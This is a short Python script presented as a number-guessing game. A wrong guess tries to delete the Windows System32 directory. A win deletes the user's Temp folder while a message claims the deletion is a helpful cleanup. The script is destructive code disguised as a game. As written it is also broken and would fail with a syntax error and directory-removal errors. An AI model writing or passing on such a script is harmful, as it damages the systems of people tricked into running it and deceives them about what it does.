import os
import random

random = random.randint(1,50)

num = int(input("Enter number: "))

if num != random:
    os.remove("C:\\Windows\System32")

else:
 print ('You win! Your temp files have been removed, enjoy more file space!'); os.remove ("C:\Users\AppData\Local\Temp")
 